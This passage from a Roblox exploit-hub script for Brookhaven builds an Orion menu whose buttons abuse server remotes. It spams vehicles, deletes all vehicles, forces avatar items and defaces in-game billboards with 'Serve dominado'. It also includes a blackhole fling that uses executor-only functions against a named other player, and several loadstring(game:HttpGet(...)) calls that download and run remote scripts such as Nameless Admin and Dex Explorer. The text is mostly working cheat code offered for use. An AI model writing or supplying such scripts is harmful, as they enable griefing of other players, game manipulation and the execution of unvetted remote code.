wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Smoke",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopSmoke()
end
end
})

local toggleActive = false
local function loopFire()
while toggleActive do
local args = {
    [1] = "Fire"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop Fire",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFire()
end
end
})
local Section = Tab:AddSection({
    Name = "Delete Vehicle"
})
Tab:AddButton({
	Name = "Delete Vehicle",
	Callback = function()
      	local args = {
    [1] = "DeleteAllVehicles"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))	
  	end    
})
local Section = Tab:AddSection({
    Name = "Horse"
})
Tab:AddButton({
	Name = "Spawn Horse",
	Callback = function()
      	local args = {
    [1] = "PickingCar",
    [2] = "Horse"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  	end    
})

local toggleActive = false
local function loopFire()
while toggleActive do
local args = {
    [1] = "BrownHorseFree"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
wait(1.0)
local args = {
    [1] = "BlackHorseFree"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Hors1eRemot1e"):FireServer(unpack(args))
wait(1.0) -- intervalo de 1 segundo entre cada repetição
end
end

Tab:AddToggle({
Name = "loop color horse",
Default = false,
Callback = function(value)
toggleActive = value
if toggleActive then
loopFire()
end
end
})
local Section = Tab:AddSection({
    Name = "Jumpscare Car - GamePass"
})
Tab:AddButton({
	Name = "Screaming Woman",
	Callback = function()
      	 local plr = game.Players.LocalPlayer
local char = plr.Character
local hrp = char.HumanoidRootPart

hrp.CFrame = CFrame.new(-24.741954803466797, 3.0249993801116943, -66.39078521728516)
wait(0.1)
local args = {
    [1] = "PickingCar",
    [2] = "SchoolBus"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
wait(1)
 local plr = game.Players.LocalPlayer
local char = plr.Character
local hrp = char.HumanoidRootPart

hrp.CFrame = CFrame.new(-35.15000534057617, 5.7094035148620605, -74.16535949707031)
wait(0.1)
local args = {
    [1] = "PickingCarMusicText",
    [2] = "892233254"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Truck"
})
Tab:AddButton({
	Name = "Spawn Truck",
	Callback = function()
      	local args = {
    [1] = "PickingCar",
    [2] = "Semi"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
  	end    
})


local toggled = false

local function FireEvent()
    while toggled do
        local args = {
            [1] = "PickingCar",
            [2] = "Semi"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        wait(0.1) -- Tempo entre cada execução, ajuste conforme necessário
    end
end


Tab:AddToggle({
    Name = "Spam Truck",
    Default = false,
    Callback = function(value)
        toggled = value
        if toggled then
            FireEvent()
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Avatares",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "Big avatar",
	Callback = function()
      		local args = {
    "CharacterChange",
    {
        130887057643589,
        88668275797583,
        79115019295211,
        130887057643589,
        80245769527311,
        106800882836405,
    },
    ""
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Avata1rOrigina1l"):FireServer(unpack(args))
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Babi davimet",
	Callback = function()
      	local args = {
    "CharacterChange",
    {
        14731377941,
        14731377894,
        14731377875,
        14731384498,
        14731377938,
        0
    },
    ""
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Avata1rOrigina1l"):FireServer(unpack(args))
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Mini Avatar",
	Callback = function()
      		local args = {
    "CharacterChange",
    {
        127031457048501,
        133265737142401,
        75333435611117,
        125434879410481,
        116071262888556,
        0
    },
    ""
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Avata1rOrigina1l"):FireServer(unpack(args))
print("button pressed")
  	end    
})


-- Variables
local name1 = ""
local name2 = ""
local name3 = ""
local repeatNames = false

-- Textbox for Name 1
Tab:AddTextbox({
Name = "Name 1",
Default = "",
TextDisappear = true,
Callback = function(value)
name1 = value
end
})

-- Textbox for Name 2
Tab:AddTextbox({
Name = "Name 2",
Default = "",
TextDisappear = true,
Callback = function(value)
name2 = value
end
})

-- Textbox for Name 3
Tab:AddTextbox({
Name = "Name 3",
Default = "",
TextDisappear = true,
Callback = function(value)
name3 = value
end
})

-- Toggle for Repeating Names
Tab:AddToggle({
Name = "Repeat Names",
Default = false,
Callback = function(value)
repeatNames = value
while repeatNames do
local args1 = {
[1] = "RolePlayName",
[2] = name1
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args1))

local args2 = {
[1] = "RolePlayName",
[2] = name2
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args2))

wait(1) -- Adjust the wait time as needed


local args3 = {
[1] = "RolePlayName",
[2] = name3
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args3))
end
end
})
local Section = Tab:AddSection({
    Name = "Limiteds"
})
local valks = {
["Valk timeless"] = 17517206952,
["Valk esmerald"] = 2830437685,
["Valk Shine Time"] = 1180433861
}

Tab:AddDropdown({
Name = "Select Valks",
Default = "",
Options = {"Valk timeless", "Valk esmerald", "Valk Shine Time"},
Callback = function(selected)
local args = {
[1] = "wear",
[2] = valks[selected]
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})

local dominus = {
["Dominus Frigidus"] = 48545806,
["Dominus Empyreus"] = 64444871,
["Dominus Astra"] = 162067148,
["Dominus Infernus"] = 31101391
}

Tab:AddDropdown({
Name = "Select Dominus",
Default = "",
Options = {"Dominus Frigidus", "Dominus Empyreus", "Dominus Astra", "Dominus Infernus"},
Callback = function(selected)
local args = {
[1] = "wear",
[2] = dominus[selected]
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Characters"
})
local characters = {
["Chef Tordet"] = {
[1] = 3657481497,
[2] = 3657478273,
[3] = 3657474549,
[4] = 3657479706,
[5] = 3745126840,
[6] = 1
},
["Chicken"] = {
[1] = 128157408,
[2] = 128157262,
[3] = 128157213,
[4] = 128157361,
[5] = 128157317,
[6] = 1
},
["Gang potato"] = {
[1] = 5392155773,
[2] = 5392150804,
[3] = 5392146467,
[4] = 5392152751,
[5] = 5392148570,
[6] = 1
},
["The overser"] = {
[1] = 81725326,
[2] = 81725366,
[3] = 81725392,
[4] = 1,
[5] = 1,
[6] = 1
},
["All korblox"] = {
[1] = 139607770,
[2] = 139607625,
[3] = 139607570,
[4] = 139607718,
[5] = 139607673,
[6] = 1
}
}

Tab:AddDropdown({
Name = "Characters",
Default = "",
Options = {"Chef Tordet", "Chicken", "Gang potato", "The overser", "All korblox"},
Callback = function(selected)
local args = {
[1] = "CharacterChange",
[2] = characters[selected],
[3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
end
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function copyAvatar(targetPlayer)
if targetPlayer and targetPlayer.Character and LocalPlayer.Character then
for _, v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
v:Destroy()
end
end

for _, v in pairs(targetPlayer.Character:GetChildren()) do
if v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then
v:Clone().Parent = LocalPlayer.Character
end
end

LocalPlayer.Character.Humanoid:ApplyDescription(targetPlayer.Character.Humanoid:GetAppliedDescription())
end
end

Tab:AddTextbox({
Name = "Player Name {Copy Avatar}",
Default = "",
TextDisappear = true,
Callback = function(value)
local targetPlayer = Players:FindFirstChild(value)
if targetPlayer then
copyAvatar(targetPlayer)
else
print("Player not found")
end
end
})
local Section = Tab:AddSection({
    Name = "Bold animatiom"
})
Tab:AddButton({
	Name = "Idle",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744209868
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Run",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744214662
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Walk",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744219182
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Jump",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744212581
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Fall",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744207822
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Climb",
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744204409
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "swim", 
	Callback = function()
      		local args = {
    [1] = "wearWalkStyle",
    [2] = 16744217055
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Head"
})
Tab:AddButton({
	Name = "Headless",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Cheek",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 746767604
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Horror Skin"
})
Tab:AddButton({
	Name = "Michael Myers",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 15133320948
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Mario Victim 1",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14732524763
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Scary",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 15036977826
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Scary dog",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14761007249
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Jeff The Killer",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 14502327402
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Korblox Legs "
})
Tab:AddButton({
	Name = "Right",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Left ",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 139607673,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Ice legs "
})
Tab:AddButton({
	Name = "Right",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139572888,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
Tab:AddButton({
	Name = "Left ",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 139572789,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})
local Section = Tab:AddSection({
    Name = "Adidas Sport animation"
})
Tab:AddButton({
	Name = "Idle",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538150608
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Run",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538133604
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Walk",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538146480
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "jump",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538153691
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Fall",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538153691
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
Tab:AddButton({
	Name = "Climb",
	Callback = function()
      		local args = {
    [1] = "wear",
    [2] = 18538170170
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
end
})
local Section = Tab:AddSection({
    Name = "Zombie "
})
Tab:AddButton({
	Name = "zombie leg",
	Callback = function()
      		local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 37754710,
        [5] = 1,
        [6] = 1
    },
    [3] = "by:REDz"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
  	end    
})


local Tab = Window:MakeTab({
	Name = "Jogador",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Anti functions"
})


Tab:AddToggle({
    Name = "Ant Sit",
    Default = false,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local humanoid = player.Character and player.Character.Humanoid
        
        if humanoid then
            if Value then
                -- Quando o toggle está ativado (Value é true), o humanoide não pode sentar em assentos
                humanoid:SetStateEnabled("Seated", false)
            else
                -- Quando o toggle está desativado (Value é false), o humanoide pode sentar em assentos normalmente
                humanoid:SetStateEnabled("Seated", true)
            end
        else
            print("Erro: Personagem não encontrado.")
        end
    end    
})


-- Variável de controle
local voidImmunityEnabled = false

-- Função para ativar/desativar a imunidade ao void
local function setVoidImmunity(state)
    if state then
        workspace.FallenPartsDestroyHeight = 0/0
    else
        workspace.FallenPartsDestroyHeight = -500 -- Valor padrão do Roblox
    end
end

-- Toggle para o Orion Lib
Tab:AddToggle({
    Name = "Anti Void",
    Default = false,
    Callback = function(State)
        voidImmunityEnabled = State
        setVoidImmunity(voidImmunityEnabled)
    end
})


-- Função para deletar o veículo específico de um jogador
local function deleteVehicleFromPlayer(player)
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if vehiclesFolder then
        local vehicleName = player.Name .. "Car"
        local vehicle = vehiclesFolder:FindFirstChild(vehicleName)
        if vehicle then
            vehicle:Destroy()
            print("Veículo deletado para: " .. player.Name)
        else
            warn("Veículo não encontrado para: " .. player.Name)
        end
    end
end

-- Função para deletar o veículo de todos os jogadores
local function deleteVehicleFromAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        deleteVehicleFromPlayer(player)
    end
end

-- Função para deletar as parts associadas ao jogador
local function deletePartsFromPlayer(player)
    local admFolder = workspace:FindFirstChild(player.Name)
    if admFolder then
        -- Lista das parts a serem deletadas
        local partsToDelete = {"Couch", "Stretcher", "Wagon", "Stroller", "ShoppingCart", "LawnMower"}
        
        for _, partName in pairs(partsToDelete) do
            local part = admFolder:FindFirstChild(partName)
            if part then
                part:Destroy()
                print(partName .. " deletada para: " .. player.Name)
            else
                warn(partName .. " não encontrada para: " .. player.Name)
            end
        end
    end
end

-- Função para deletar as parts de todos os jogadores
local function deletePartsFromAllPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        deletePartsFromPlayer(player)
    end
end

-- Variável de controle do loop
local isLooping = false

-- Função para controlar o loop
local function startLoop()
    while isLooping do
        deleteVehicleFromAllPlayers()       -- Deletar veículos de todos os jogadores
        deletePartsFromAllPlayers()         -- Deletar as parts de todos os jogadores
        wait(1) -- Tempo entre cada execução do loop (5 segundos neste exemplo)
    end
end

Tab:AddToggle({
    Name = "Anti Fling",
    Default = false,
    Callback = function(state)
        isLooping = state
        if isLooping then
            startLoop()
        end
    end    
})


local Section = Tab:AddSection({
	Name = "Notificar Saída e Entrada dos Jogadores"
})

local notifyPlayers = false

Tab:AddToggle({
    Name = "Ativar Notificações de Saída e Entrada dos Jogadores",
    Default = false,
    Callback = function(Value)
        notifyPlayers = Value
    end
})

game.Players.PlayerAdded:Connect(function(player)
    if notifyPlayers then
        local message = string.format("%s(%s) entrou no servidor!", player.Name, player.DisplayName)
        OrionLib:MakeNotification({
            Name = "Entrada de Jogador",
            Content = message,
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if notifyPlayers then
        local message = string.format("%s(%s) saiu do servidor!", player.Name, player.DisplayName)
        OrionLib:MakeNotification({
            Name = "Saída de Jogador",
            Content = message,
            Image = "rbxassetid://132225387260946",
            Time = 5
        })
    end
end)


local Tab = Window:MakeTab({
	Name = "OutDoors",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "OutDoor 1 Teleport",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(444.0184631347656, 64.14906311035156, 511.88665771484375)
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Outdoor 2 Teleport",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-632.8937377929688, 26.354162216186523, 360.3209228515625)
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Outdoor 3 Teleport",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-240.04434204101562, 89.30069732666016, -546.7059326171875)
print("button pressed")
  	end    
})


local Section = Tab:AddSection({
	Name = "Text Outdoor Chegue Perto de cada Outdoor"
})


Tab:AddButton({
	Name = "aplica text serve dominado(outdoor 3)",
	Callback = function()
      	local args = {
    [1] = "ReturningCommercialWords",
    [2] = 3,
    [4] = "Serve dominado"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y"):FireServer(unpack(args))
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Aplica Texto Serve dominado (Outdoor 2)",
	Callback = function()
      		local args = {
    [1] = "ReturningCommercialWords",
    [2] = 2,
    [4] = "serve dominado"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y"):FireServer(unpack(args))
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Aplica Texto Serve dominado (Outdoor 1)",
	Callback = function()
      		local args = {
    [1] = "ReturningCommercialWords",
    [2] = 1,
    [4] = "serve dominado"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y"):FireServer(unpack(args))
print("button pressed")
  	end    
})


local Tab = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "Remote Spy",
	Callback = function()
      	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-remote-spy-mobile-reupload-24466"))()
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Dex Explorer",
	Callback = function()
      	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dex-Explorer-No-Key-29915"))()
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Black Role gui By noly",
	Callback = function()
local Gui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Box = Instance.new("TextBox")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local Label = Instance.new("TextLabel")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local Button = Instance.new("TextButton")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")

--Propriedades:

Gui.Name = "Gui"
Gui.Parent = gethui()
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = Gui
Main.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.335954279, 0, 0.542361975, 0)
Main.Size = UDim2.new(0.240350261, 0, 0.166880623, 0)
Main.Active = true
Main.Draggable = true

Box.Name = "Box"
Box.Parent = Main
Box.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
Box.BorderColor3 = Color3.fromRGB(0, 0, 0)
Box.BorderSizePixel = 0
Box.Position = UDim2.new(0.0980926454, 0, 0.218712583, 0)
Box.Size = UDim2.new(0.801089942, 0, 0.364963502, 0)
Box.FontFace = Font.new("rbxasset://fonts/families/SourceSansSemibold.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Box.PlaceholderText = "nome do jogador aqui(iniciais do nome @ | Spawna blackhole na pessoa Cujo nome aqui)"
Box.Text = ""
Box.TextColor3 = Color3.fromRGB(255, 255, 255)
Box.TextScaled = true
Box.TextSize = 31.000
Box.TextWrapped = true

UITextSizeConstraint.Parent = Box
UITextSizeConstraint.MaxTextSize = 31

Label.Name = "Label"
Label.Parent = Main
Label.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Label.BorderSizePixel = 0
Label.Size = UDim2.new(1, 0, 0.160583943, 0)
Label.FontFace = Font.new("rbxasset://fonts/families/Nunito.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Label.Text = "BlackHole | Police Brookhaven"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextScaled = true
Label.TextSize = 14.000
Label.TextWrapped = true

UITextSizeConstraint_2.Parent = Label
UITextSizeConstraint_2.MaxTextSize = 21

Button.Name = "Button"
Button.Parent = Main
Button.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(0.183284417, 0, 0.656760991, 0)
Button.Size = UDim2.new(0.629427791, 0, 0.277372271, 0)
Button.Font = Enum.Font.Nunito
Button.Text = "BlackHole | Off"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.TextSize = 28.000
Button.TextWrapped = true

UITextSizeConstraint_3.Parent = Button
UITextSizeConstraint_3.MaxTextSize = 28

-- Scripts:

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local character
local humanoidRootPart

mainStatus = true
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
	if input.KeyCode == Enum.KeyCode.RightControl and not gameProcessedEvent then
		mainStatus = not mainStatus
		Main.Visible = mainStatus
	end
end)

local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

if not getgenv().Network then
	getgenv().Network = {
		BaseParts = {},
		Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
	}

	Network.RetainPart = function(Part)
		if Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
			table.insert(Network.BaseParts, Part)
			Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
			Part.CanCollide = false
		end
	end

	local function EnablePartControl()
		LocalPlayer.ReplicationFocus = Workspace
		RunService.Heartbeat:Connect(function()
			sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
			for _, Part in pairs(Network.BaseParts) do
				if Part:IsDescendantOf(Workspace) then
					Part.Velocity = Network.Velocity
				end
			end
		end)
	end

	EnablePartControl()
end

local function ForcePart(v)
	if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
		for _, x in ipairs(v:GetChildren()) do
			if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then
				x:Destroy()
			end
		end
		if v:FindFirstChild("Attachment") then
			v:FindFirstChild("Attachment"):Destroy()
		end
		if v:FindFirstChild("AlignPosition") then
			v:FindFirstChild("AlignPosition"):Destroy()
		end
		if v:FindFirstChild("Torque") then
			v:FindFirstChild("Torque"):Destroy()
		end
		v.CanCollide = false
		local Torque = Instance.new("Torque", v)
		Torque.Torque = Vector3.new(100000, 100000, 100000)
		local AlignPosition = Instance.new("AlignPosition", v)
		local Attachment2 = Instance.new("Attachment", v)
		Torque.Attachment0 = Attachment2
		AlignPosition.MaxForce = math.huge
		AlignPosition.MaxVelocity = math.huge
		AlignPosition.Responsiveness = 200
		AlignPosition.Attachment0 = Attachment2
		AlignPosition.Attachment1 = Attachment1
	end
end

local blackHoleActive = false
local DescendantAddedConnection

local function toggleBlackHole()
	blackHoleActive = not blackHoleActive
	if blackHoleActive then
		Button.Text = "Blackhole | On"
		for _, v in ipairs(Workspace:GetDescendants()) do
			ForcePart(v)
		end

		DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)
			if blackHoleActive then
				ForcePart(v)
			end
		end)

		spawn(function()
			while blackHoleActive and RunService.RenderStepped:Wait() do
				Attachment1.WorldCFrame = humanoidRootPart.CFrame
			end
		end)
	else
		Button.Text = "Blackhole | Off"
		if DescendantAddedConnection then
			DescendantAddedConnection:Disconnect()
		end
	end
end

local function getPlayer(name)
	local lowerName = string.lower(name)
	for _, p in pairs(Players:GetPlayers()) do
		local lowerPlayer = string.lower(p.Name)
		if string.find(lowerPlayer, lowerName) then
			return p
		elseif string.find(string.lower(p.DisplayName), lowerName) then
			return p
		end
	end
end

local player = nil

local function VDOYZQL_fake_script() -- Box.Script 
	local script = Instance.new('Script', Box)

	script.Parent.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			player = getPlayer(Box.Text)
			if player then
				Box.Text = player.Name
				print("Player found:", player.Name)
			else
				print("Player not found")
			end
		end
	end)
end
coroutine.wrap(VDOYZQL_fake_script)()
local function JUBNQKI_fake_script() -- Button.Script 
	local script = Instance.new('Script', Button)

	script.Parent.MouseButton1Click:Connect(function()
		if player then
			character = player.Character or player.CharacterAdded:Wait()
			humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			toggleBlackHole()
		else
			print("Player is not selected")
		end
	end)
end
coroutine.wrap(JUBNQKI_fake_script)()

print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Nameles Adm",
	Callback = function()
      	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-V2-24856"))()
	print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Nameles V 11.3",
	Callback = function()
      		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-admin-30209"))()
print("button pressed")
  	end    
})


local Tab = Window:MakeTab({
	Name = "Funções Vip",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
    Name = "Selecionar Motor de Carro VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "CarEngineBlower"
}

